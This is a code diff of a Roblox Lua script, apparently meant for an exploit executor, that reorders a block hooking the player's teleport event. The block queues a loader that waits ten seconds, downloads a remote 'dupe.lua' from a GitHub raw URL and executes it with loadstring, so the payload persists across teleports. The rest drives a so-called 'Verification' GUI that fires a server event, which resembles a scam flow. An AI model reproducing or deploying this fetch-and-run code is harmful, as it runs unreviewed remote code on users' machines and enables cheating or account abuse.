@@ -1,3 +1,11 @@
+game.Players.LocalPlayer.OnTeleport:Connect(function()
+    queue_on_teleport([[
+        wait(10)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/qwertyu4t55567rgdf/fling/refs/heads/main/dupe.lua"))()
+    ]])
+end)
+
+
 local copy = game.Players.LocalPlayer.PlayerGui.Verification.Verefy.VerefyButton.Code.CopyCode
 local verifybutton = game.Players.LocalPlayer.PlayerGui.Verification.Verefy.VerefyButton
 local event = game.Players.LocalPlayer.PlayerGui.Verification.Verefy.Event
@@ -22,10 +30,3 @@ verifybutton.MouseButton1Click:Connect(function()
 end)
 
 event:FireServer(true)
-
-game.Players.LocalPlayer.OnTeleport:Connect(function()
-    queue_on_teleport([[
-        wait(10)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/qwertyu4t55567rgdf/fling/refs/heads/main/dupe.lua"))()
-    ]])
-end)
